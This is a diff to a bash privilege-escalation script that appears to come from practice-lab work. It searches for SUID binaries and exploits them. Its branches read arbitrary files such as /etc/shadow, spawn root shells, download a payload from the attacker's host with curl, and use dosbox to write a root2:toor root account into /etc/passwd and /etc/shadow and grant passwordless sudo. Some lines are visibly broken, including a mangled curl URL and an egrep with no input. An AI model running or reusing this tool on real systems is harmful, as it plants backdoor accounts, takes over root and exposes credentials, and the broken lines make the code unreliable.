@@ -4,6 +4,8 @@
 #Many of the exploits came from doing boxes on Proving Grounds Play and Practice
 #Built by OvergrownCarrot1 Thanks for using
 
+#Script only looks at /usr/bin, yes you may have to manually exploit something...
+
 now=$(date)
 i=$(whoami)
 d=$(id)
@@ -18,7 +20,7 @@ else
 fi
 
 echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration and exploitation"; tput sgr0
-echo -e '\E[32;40m'"Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)";tput sgr0
+echo -e '\E[32;40m' "Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)";tput sgr0
 echo -e '\E[31;40m' "Segmentation fault or critical error is ok... let the script continue running";tput sgr0
 sleep 2
 echo -e '\E[31;40m' "LHOST"; tput sgr0
@@ -178,163 +180,172 @@ else
 fi
 
 ####################################################################################################################
-	read -p "Look for files that can read other files (ex: /etc/shadow)? (y/n):" answer
+	read -p "Look for SUID Bits that can read other files (ex: /etc/shadow)? (y/n):" answer
 if [ $answer = n ]; then
 	echo -e '\E[31;40m' "Not looking for files that will allow us to read other files"
 else
 	echo -e '\E[31;40m' "Looking for files that will allow us to read another file (ex: /etc/shadow)"; tput sgr0
-	if grep -w "/usr/bin/awk" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer 
-		/usr/bin/awk '//' "$LFILE"
-	elif grep -w "/usr/bin/base32" suid.txt ; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/base32 "$LFILE" | base32 --decode
-	elif grep -w "/usr/bin/base64" suid.txt ; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/base64 "$LFILE" | base64 --decode
-	elif grep -w "/usr/bin/basenc" suid.txt ; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/basenc --base64 $LFILE | basenc -d --base64
-	elif grep -w "/usr/bin/cat" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/cat "$LFILE"
-	elif grep -w "alpine" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/alpine -F "$LFILE"
-	elif grep -w "/usr/bin/as" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/as @$LFILE
-	elif grep -w "ascii-xfr" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/ascii-xfr -ns "$LFILE"
-	elif grep -w "/usr/bin/ash" suid.txt; then
-		/usr/bin/ash
-	elif grep -w "aspell" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/aspell -c "$LFILE"
-	elif grep -w "atobm" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
-	elif grep -w "/usr/bin/awk" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/awk '//' "$LFILE"
-		echo -e '\E[31;40m' "May be able to get a shell with limited SUID by using command ./awk 'BEGIN {system(\"/bin/sh\")}'"; tput sgr0
-	elif grep -w "basez" suid.txt;  then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/basez "$LFILE" | basez --decode
-	elif grep -w "/usr/bin/bc" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/bc -s $LFILE
-		quit
-	elif grep -w "bridge" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/bridge -b "$LFILE"
-	elif grep -w "bzip2" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/bzip2 -c $LFILE | bzip2 -d
-	elif grep -w "cmp" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/cmp $LFILE /dev/zero -b -l
-	elif grep -w "column" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/column $LFILE
-	elif grep -w "comm" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/comm $LFILE /dev/null 2>/dev/null
-	elif grep -w "csplit" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/csplit $LFILE 1
-		cat xx01
-	elif grep -w "csvtool" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/csvtool trim t $LFILE
-	elif grep -w "cupsfilter" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
-	elif grep -w "/usr/bin/curl" suid.txt; then
-		read -p "File to get from attacker machine (ex: shell.elf):" answer
-		URL=http://$LHOST:$LPORT/$answer
-		LFILE=$answer
-		/usr/bin/curl $URL -o /tmp/$LFILE
-	elif grep -w "cut" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/cut -d "" -f1 "$LFILE"
-	elif grep -w "/usr/bin/date" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/date -f $LFILE
-	elif grep -w "/usr/bin/dd" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		echo "data" | /usr/bin/dd of=$LFILE
-	elif grep -w "debugfs" suid.txt; then
-		/usr/bin/debugfs
-		\!/bin/sh
-	elif grep -w "dialog" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/dialog --textbox "$LFILE" 0 0
-	elif grep -w -w "/usr/bin/diff" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/diff --line-format=%L /dev/null $LFILE
-	elif grep -w -w "/usr/bin/dig" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/dig -f $LFILE
-	elif grep -w "dosbox" suid.txt; then
-		LFILE=/etc/passwd
-		echo -e '\E[31;40m' "Putting user root2:toor into /etc/passwd and /etc/shadow"
-		/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
-		LFILE=/etc/shadow
-		/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
-		cat /etc/passwd | grep -i root2
-		cat /etc/shadow | grep -i root2
-	elif grep -w "/usr/bin/ed" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/ed file_to_read
-		,p
-		q
-	elif grep -w "efax" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/efax -d "$LFILE"
+	if egrep 'base|cat|alpine|ascii-xfr|ash|aspell|atobm|awk|bridge|bzip2|cmp|column|comm|csplit|csvtool|cupsfilter|curl|cut|date|debugfs|dialog|diff|dig|dosbox|efax|arp|ar|ed|dd|bc|as'; then
+		if grep -w "/usr/bin/awk" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer 
+			/usr/bin/awk '//' "$LFILE"
+		elif grep -w "/usr/bin/base32" suid.txt ; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/base32 "$LFILE" | base32 --decode
+		elif grep -w "/usr/bin/base64" suid.txt ; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/base64 "$LFILE" | base64 --decode
+		elif grep -w "/usr/bin/basenc" suid.txt ; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/basenc --base64 $LFILE | basenc -d --base64
+		elif grep -w "/usr/bin/cat" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/cat "$LFILE"
+		elif grep -w "alpine" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/alpine -F "$LFILE"
+		elif grep -w "/usr/bin/as" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/as @$LFILE
+		elif grep -w "ascii-xfr" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/ascii-xfr -ns "$LFILE"
+		elif grep -w "/usr/bin/ash" suid.txt; then
+			/usr/bin/ash
+		elif grep -w "aspell" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/aspell -c "$LFILE"
+		elif grep -w "atobm" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+		elif grep -w "/usr/bin/awk" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/awk '//' "$LFILE"
+			echo -e '\E[31;40m' "May be able to get a shell with limited SUID by using command ./awk 'BEGIN {system(\"/bin/sh\")}'"; tput sgr0
+		elif grep -w "basez" suid.txt;  then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/basez "$LFILE" | basez --decode
+		elif grep -w "/usr/bin/bc" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/bc -s $LFILE
+			quit
+		elif grep -w "bridge" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/bridge -b "$LFILE"
+		elif grep -w "bzip2" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/bzip2 -c $LFILE | bzip2 -d
+		elif grep -w "cmp" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/cmp $LFILE /dev/zero -b -l
+		elif grep -w "column" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/column $LFILE
+		elif grep -w "comm" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/comm $LFILE /dev/null 2>/dev/null
+		elif grep -w "csplit" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/csplit $LFILE 1
+			cat xx01
+		elif grep -w "csvtool" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/csvtool trim t $LFILE
+		elif grep -w "cupsfilter" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+		elif grep -w "/usr/bin/curl" suid.txt; then
+			read -p "File to get from attacker machine (ex: shell.elf):" answer
+			URL=http://$LHOST:$LPORT/$answer
+			LFILE=$answer
+			/usr/bin/curl /usr/binRL -o /tmp/$LFILE
+		elif grep -w "cut" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/cut -d "" -f1 "$LFILE"
+		elif grep -w "/usr/bin/date" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/date -f $LFILE
+		elif grep -w "/usr/bin/dd" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			echo "data" | /usr/bin/dd of=$LFILE
+		elif grep -w "debugfs" suid.txt; then
+			/usr/bin/debugfs
+			\!/bin/sh
+		elif grep -w "dialog" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/dialog --textbox "$LFILE" 0 0
+		elif grep -w -w "/usr/bin/diff" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/diff --line-format=%L /dev/null $LFILE
+		elif grep -w -w "/usr/bin/dig" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/dig -f $LFILE
+		elif grep -w "dosbox" suid.txt; then
+			LFILE=/etc/passwd
+			echo -e '\E[31;40m' "Putting user root2:toor into /etc/passwd and /etc/shadow"
+			/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
+			LFILE=/etc/shadow
+			/usr/bin/dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
+			cat /etc/passwd | grep -i root2
+			cat /etc/shadow | grep -i root2
+			echo -e '\E[31;40m' "Sometimes dosbox likes to add a M^ at the end of a file, also updating sudo permissions to run sudo with no password"
+			whoami
+			echo -e '\E[32;40m' "Current user?"
+			read LUSER
+			LFILE=/etc/sudoers
+			/usr/bin/dosbox -c 'mount c /' -c "echo $LUSER ALL=(ALL) NOPASSWD:ALL >c:$LFILE" -c exit
+			sudo su
+		elif grep -w "/usr/bin/ed" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/ed file_to_read
+			,p
+			q
+		elif grep -w "efax" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/efax -d "$LFILE"
 #KEEP ARP AT THE BOTTOM OF FILE
-	elif grep -w "/usr/bin/arp" suid.txt; then
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/arping -v -f "$LFILE"
-	elif grep -w "/usr/bin/ar" suid.txt; then
-		TF=$(mktemp -u)
-		read -p "What file would you like to view (ex: /etc/shadow):" answer
-		LFILE=$answer
-		/usr/bin/ar r "$TF" "$LFILE"
-		cat "$TF"
-	else
-		echo -e '\E[32;40m' "Found nothing to exploit"
+		elif grep -w "/usr/bin/arp" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/arp -v -f "$LFILE"
+		elif grep -w "/usr/bin/ar" suid.txt; then
+			TF=$(mktemp -u)
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/ar r "$TF" "$LFILE"
+			cat "$TF"
+		else
+			echo -e '\E[32;40m' "Found nothing to exploit"
+		fi
 	fi
 fi
 find /etc -writable -ls 2>/dev/null > write.txt
